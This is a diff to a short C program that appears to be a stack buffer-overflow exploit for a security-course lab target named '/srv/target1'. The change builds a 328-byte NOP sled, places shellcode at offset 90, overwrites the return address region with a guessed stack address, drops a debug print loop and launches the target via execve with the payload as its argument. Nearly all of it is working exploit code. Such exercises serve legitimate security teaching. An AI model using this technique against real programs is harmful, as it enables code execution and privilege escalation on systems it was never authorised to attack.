@@ -7,28 +7,32 @@
 
 #define TARGET "/srv/target1"
 
-int main(void)
-{
-    char exploit[20];
+int main(void) {
     char *args[3];
     char *env[1];
 
-    memset(exploit, 0x90, sizeof(exploit));
+    int buffsize = 328; // Adjust if necessary based on further stack analysis
+    char exploit[buffsize];
+    int i;
 
-    memcpy(exploit, shellcode, sizeof(shellcode) - 1);
+    // Fill the buffer with NOPs
+    memset(exploit, 0x90, buffsize);
 
-    uint32_t ret_address = 0xffffd518; 
-    memcpy(exploit + 16, &ret_address, 4);
+    // Copy the shellcode in the middle of the NOP sled
+    memcpy(exploit + 90, shellcode, sizeof(shellcode) - 1);
+
+    // Overwrite the return address
+    // Choose an address in the NOP sled; change if you find the exact address needed
+    uint32_t ret_addr = 0xffffd600; // Adjust based on your stack analysis
+    for (i = 292; i < buffsize; i += 4) {
+        *(uint32_t *)(exploit + i) = ret_addr;
+    }
 
     args[0] = TARGET;
     args[1] = exploit;
     args[2] = NULL;
 
     env[0] = NULL;
-
-    for (int i = 0; i < sizeof(exploit); i++)
-        printf("\\x%02x", (unsigned char)exploit[i]);
-    printf("\n");
 
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
